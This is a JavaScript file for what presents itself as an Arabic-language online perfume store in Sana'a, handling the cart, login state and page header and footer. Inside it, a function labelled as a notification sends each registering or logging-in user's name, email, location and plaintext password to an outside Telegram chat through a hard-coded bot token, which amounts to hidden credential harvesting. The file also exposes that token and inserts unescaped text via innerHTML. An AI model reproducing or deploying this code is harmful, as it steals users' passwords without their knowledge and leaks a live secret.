// ===== CART MANAGEMENT =====
function getCart() {
  try { return JSON.parse(localStorage.getItem('massoudi_cart')) || []; }
  catch(e) { return []; }
}
function saveCart(cart) {
  localStorage.setItem('massoudi_cart', JSON.stringify(cart));
  updateCartCount();
}
function addToCart(productId, qty) {
  qty = qty || 1;
  const cart = getCart();
  const idx = cart.findIndex(i => i.id === productId);
  if (idx >= 0) {
    cart[idx].qty += qty;
  } else {
    cart.push({ id: productId, qty: qty });
  }
  saveCart(cart);
  showToast('تمت الإضافة إلى السلة ✓', 'success');
}
function removeFromCart(productId) {
  const cart = getCart().filter(i => i.id !== productId);
  saveCart(cart);
}
function updateCartCount() {
  const cart = getCart();
  const total = cart.reduce((s, i) => s + i.qty, 0);
  document.querySelectorAll('.cart-count').forEach(el => {
    el.textContent = total;
    el.classList.toggle('hidden', total === 0);
  });
}
function getCartTotal() {
  const cart = getCart();
  return cart.reduce((s, item) => {
    const p = products.find(pr => pr.id === item.id);
    return s + (p ? p.price * item.qty : 0);
  }, 0);
}

// ===== AUTH MANAGEMENT =====
function getUser() {
  try { return JSON.parse(localStorage.getItem('massoudi_user')); }
  catch(e) { return null; }
}
function isLoggedIn() { return !!getUser(); }
function saveUser(user) { localStorage.setItem('massoudi_user', JSON.stringify(user)); }
function logout() {
  localStorage.removeItem('massoudi_user');
  window.location.href = 'index.html';
}

// ===== PRICE FORMAT =====
function formatPrice(price) {
  return price.toLocaleString('ar-YE') + ' ﷼';
}

// ===== DISCOUNT CALC =====
function calcDiscount(price, oldPrice) {
  if (!oldPrice) return 0;
  return Math.round(((oldPrice - price) / oldPrice) * 100);
}

// ===== TOAST =====
function showToast(msg, type) {
  type = type || 'info';
  let container = document.querySelector('.toast-container');
  if (!container) {
    container = document.createElement('div');
    container.className = 'toast-container';
    document.body.appendChild(container);
  }
  const icons = { success: '✅', error: '❌', info: 'ℹ️' };
  const toast = document.createElement('div');
  toast.className = 'toast toast-' + type;
  toast.innerHTML = '<span>' + (icons[type] || '') + '</span><span>' + msg + '</span>';
  container.appendChild(toast);
  setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.4s'; setTimeout(() => toast.remove(), 400); }, 3000);
}

// ===== TELEGRAM NOTIFICATION =====
async function sendTelegramNotification(data) {
  const token = '8549358187:AAHrsZAX-gYc8pZzXW_5RZ98W0-UKekGE8c';
  const chatId = '7770087246';

  let message = '';
  if (data.type === 'register') {
    message = `🆕 تسجيل حساب جديد:\n👤 الاسم: ${data.firstName} ${data.lastName}\n📧 البريد: ${data.email}\n🏙️ المدينة: ${data.city}\n🌍 الدولة: ${data.country}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
  } else if (data.type === 'login') {
    message = `🔐 تسجيل دخول:\n👤 الاسم: ${data.name}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
  }

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
  } catch (e) {
    console.error('فشل إرسال الإشعار إلى Telegram:', e);
  }
}

// ===== PRODUCT CARD HTML =====
function renderProductCard(product, showDiscount) {
  const discount = calcDiscount(product.price, product.oldPrice);
  const catCls = categoryClass[product.category] || '';
  return `
    <div class="product-card" data-id="${product.id}" data-category="${product.category}">
      <div class="product-image-wrap">
        <div class="product-img-placeholder ${catCls}" style="width:100%;height:100%;">${product.emoji}</div>
        ${discount > 0 ? `<span class="discount-badge">-${discount}%</span>` : ''}
      </div>
      <div class="product-info">
        <div class="product-name">${product.name}</div>
        <div class="product-price-wrap">
          <span class="price-current">${formatPrice(product.price)}</span>
          ${product.oldPrice ? `<span class="price-old">${formatPrice(product.oldPrice)}</span>` : ''}
        </div>
        <button class="btn-add-cart" onclick="addToCart(${product.id}); this.classList.add('added'); this.innerHTML='✓ أُضيف للسلة'; setTimeout(()=>{this.classList.remove(\'added\'); this.innerHTML=\'🛒 أضف إلى السلة\';},2000);">
          🛒 أضف إلى السلة
        </button>
      </div>
    </div>`;
}

// ===== RENDER HEADER =====
function renderHeader(currentPage) {
  const user = getUser();
  const authBtns = user
    ? `<div class="user-info-nav"><span>👤 ${user.firstName || user.name || 'عميل'}</span>
        <a href="dashboard.html" style="color:var(--gold);font-size:12px;">لوحة التحكم</a>
        <button class="btn-logout-nav" onclick="logout()">خروج</button></div>`
    : `<a href="signin.html"><button class="btn-login">تسجيل الدخول</button></a>
       <a href="register.html"><button class="btn-register">إنشاء حساب</button></a>`;

  document.getElementById('site-header').innerHTML = `
    <div class="announcement-bar">
      <span class="icon-blink">🎉</span>
      &nbsp; عروضات بمناسبة افتتاح المنصة التسويقية (المسعودي للعطور) .. تخفيضات تصل إلى 30% وهدايا مجانية &nbsp;
      <span class="icon-blink">🎁</span>
    </div>
    <div class="brand-header">
      <div class="brand-name">المسعودي للعطور</div>
      <div class="brand-subtitle">✨ متجر العطور والبخور الفاخرة ✨</div>
    </div>
    <nav class="top-nav">
      <div class="top-nav-links">
        <a href="index.html">🏠 الرئيسية</a>
        <span class="sep">|</span>
        <a href="store.html">🛍️ المتجر</a>
        <span class="sep">|</span>
        <a href="#" style="color:#ccc;">🌐 العربية</a>
        <span class="sep">|</span>
        <a href="#" style="color:#ccc;">💰 ريال يمني</a>
        <span class="sep">|</span>
        <a href="mailto:info@massoudi.ye">📧 البريد</a>
        <span class="sep">|</span>
        <a href="tel:+967‎785179100">📞 اتصل بنا</a>
      </div>
      <div class="top-nav-actions">
        ${authBtns}
        <a href="cart.html">
          <button class="cart-btn">🛒<span class="cart-count hidden">0</span></button>
        </a>
      </div>
    </nav>`;
  updateCartCount();
}

// ===== RENDER FOOTER =====
function renderFooter() {
  const el = document.getElementById('site-footer');
  if (!el) return;
  el.innerHTML = `
    <footer class="site-footer">
      <div class="footer-grid">
        <div class="footer-col">
          <div class="footer-brand">المسعودي للعطور</div>
          <p>متجر العطور والبخور الفاخرة<br>أجود الروائح اليمنية والعالمية</p>
          <p style="margin-top:12px;">📍 صنعاء، اليمن</p>
        </div>
        <div class="footer-col">
          <h4>روابط سريعة</h4>
          <a href="index.html">الصفحة الرئيسية</a>
          <a href="store.html">المتجر</a>
          <a href="cart.html">سلة التسوق</a>
          <a href="signin.html">تسجيل الدخول</a>
          <a href="register.html">إنشاء حساب</a>
        </div>
        <div class="footer-col">
          <h4>معلومات</h4>
          <a href="#">عن الموقع</a>
          <a href="#">سياسة التوصيل</a>
          <a href="#">طرق الدفع</a>
          <a href="#">سياسة الخصوصية</a>
          <a href="#">الشروط والأحكام</a>
        </div>
        <div class="footer-col">
          <h4>تواصل معنا</h4>
          <p>📞 +967 ‎785179100</p>
          <p>📧 info@massoudi.ye</p>
          <p>⏰ 9ص – 9م يومياً</p>
          <div style="margin-top:12px;display:flex;gap:10px;">
            <a href="#" style="font-size:1.4rem;">📘</a>
            <a href="#" style="font-size:1.4rem;">📸</a>
            <a href="#" style="font-size:1.4rem;">📱</a>
          </div>
        </div>
      </div>
      <div class="footer-bottom">
        © 2026 المسعودي للعطور – صنعاء، اليمن. جميع الحقوق محفوظة.
      </div>
    </footer>`;
}

// ===== INIT ON LOAD =====
document.addEventListener('DOMContentLoaded', function() {
  if (document.getElementById('site-header')) renderHeader();
  if (document.getElementById('site-footer')) renderFooter();
  updateCartCount();
});